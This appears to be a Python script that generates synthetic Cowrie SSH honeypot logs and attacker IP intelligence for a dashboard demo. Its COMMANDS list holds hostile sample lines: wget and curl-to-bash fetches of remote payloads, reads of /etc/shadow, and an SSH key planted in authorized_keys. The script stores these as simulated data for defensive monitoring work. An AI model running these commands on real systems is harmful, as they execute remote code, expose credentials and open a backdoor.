"""
generate_sample_data.py
Generates realistic sample Cowrie log data and pre-populated SQLite DB
so you can run the dashboard locally without a live honeypot VM.
Run once: python scripts/generate_sample_data.py
"""

import json, os, random, sys
from datetime import datetime, timedelta

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../parser"))
from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(__file__), "../.env"))

from db_manager import init_db, insert_event, upsert_session, upsert_ip_intel, DB_PATH

# ── Realistic attacker profile data ──────────────────────────────────────────

ATTACKER_IPS = [
    ("185.220.101.47", "Germany",     "DE", "Frankfurt",   "Tor Exit Node",       95, 3412, 50.11,  8.68, 1),
    ("45.142.212.100", "Russia",      "RU", "Moscow",      "AS49505 Selectel",    87, 1203, 55.75, 37.62, 0),
    ("103.124.105.83", "China",       "CN", "Beijing",     "Chinanet",            78, 934,  39.91, 116.39,0),
    ("192.241.220.122","United States","US","New York",    "DigitalOcean",         62, 501,  40.71,-74.01, 0),
    ("89.248.167.131",  "Netherlands","NL", "Amsterdam",   "Shodan.io",           91, 2890, 52.37,  4.90, 0),
    ("171.25.193.20",  "Sweden",      "SE", "Stockholm",   "Tor Exit Node",       96, 4201, 59.33, 18.07, 1),
    ("218.92.0.210",   "China",       "CN", "Jiangsu",     "ChinaNet",            83, 1102, 31.97, 119.10,0),
    ("5.188.62.140",   "Russia",      "RU", "St Petersburg","TimeWeb",            71, 612,  59.93, 30.32, 0),
    ("134.122.126.1",  "United States","US","San Francisco","DigitalOcean",        58, 390,  37.77,-122.42,0),
    ("209.141.36.220", "United States","US","Las Vegas",   "Frantech Solutions",  44, 220,  36.17,-115.14,0),
    ("195.54.160.149", "Ukraine",     "UA", "Kyiv",        "Volia",               35, 145,  50.45, 30.52, 0),
    ("117.21.191.16",  "China",       "CN", "Shanghai",    "ChinaNet",            69, 734,  31.22, 121.46,0),
]

USERNAMES = ["root","admin","ubuntu","pi","user","test","oracle","git","deploy","postgres","ec2-user","vagrant","support","guest","www"]
PASSWORDS = ["123456","password","admin","root","toor","qwerty","letmein","12345","raspberry","1234","pass","admin123","test","changeme","welcome"]
COMMANDS  = [
    "uname -a","cat /etc/passwd","cat /etc/shadow","id","whoami",
    "wget http://45.142.212.100/payload.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    "curl -s http://103.124.105.83/bot.sh | bash","ls -la /","ps aux","netstat -tlnp",
    "cat /proc/cpuinfo","free -m","df -h","history","find / -perm -4000 2>/dev/null",
    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys","crontab -l",
]


def random_ts(base: datetime, spread_hours: int = 168) -> str:
    delta = timedelta(seconds=random.randint(0, spread_hours * 3600))
    return (base - delta).isoformat() + "Z"


def generate(db_path: str = DB_PATH, n_sessions: int = 400):
    init_db(db_path)
    now = datetime.utcnow()

    # Populate ip_intel
    for (ip, country, cc, city, isp, score, reports, lat, lon, tor) in ATTACKER_IPS:
        upsert_ip_intel({
            "ip": ip, "country": country, "country_code": cc,
            "region": "", "city": city, "isp": isp, "org": isp,
            "asn": isp, "lat": lat, "lon": lon,
            "abuse_score": score, "abuse_reports": reports,
            "last_seen": now.isoformat(), "is_tor": tor,
            "enriched_at": now.isoformat(),
        }, db_path)

    # Generate events
    for _ in range(n_sessions):
        attacker = random.choice(ATTACKER_IPS)
        ip       = attacker[0]
        session  = f"sess_{random.randint(100000, 999999)}"
        ts_start = random_ts(now)
        n_attempts = random.randint(1, 8)

        # Connection event
        insert_event({
            "event_id": "cowrie.session.connect",
            "timestamp": ts_start, "src_ip": ip, "src_port": random.randint(1024,65535),
            "session": session, "username": None, "password": None,
            "command": None, "success": 0,
            "raw": json.dumps({"eventid": "cowrie.session.connect", "src_ip": ip}),
        }, db_path)

        # Login attempts
        for i in range(n_attempts):
            u = random.choice(USERNAMES)
            p = random.choice(PASSWORDS)
            login_success = (i == n_attempts - 1) and random.random() < 0.15
            insert_event({
                "event_id": "cowrie.login.success" if login_success else "cowrie.login.failed",
                "timestamp": ts_start, "src_ip": ip, "src_port": random.randint(1024,65535),
                "session": session, "username": u, "password": p,
                "command": None, "success": 1 if login_success else 0,
                "raw": json.dumps({"eventid": "cowrie.login.failed", "username": u, "password": p}),
            }, db_path)

            if login_success:
                for cmd in random.sample(COMMANDS, k=random.randint(2, 6)):
                    insert_event({
                        "event_id": "cowrie.command.input",
                        "timestamp": ts_start, "src_ip": ip, "src_port": 0,
                        "session": session, "username": u, "password": None,
                        "command": cmd, "success": 1,
                        "raw": json.dumps({"eventid": "cowrie.command.input", "input": cmd}),
                    }, db_path)

        upsert_session({
            "session_id": session, "src_ip": ip,
            "start_time": ts_start, "end_time": ts_start,
            "duration_secs": random.uniform(1, 120),
            "commands_run": random.randint(0, 6),
            "login_success": 0,
        }, db_path)

    print(f"[sample] Generated {n_sessions} sessions into {db_path}")
    print("[sample] You can now start the API: cd api && python app.py")


if __name__ == "__main__":
    generate()
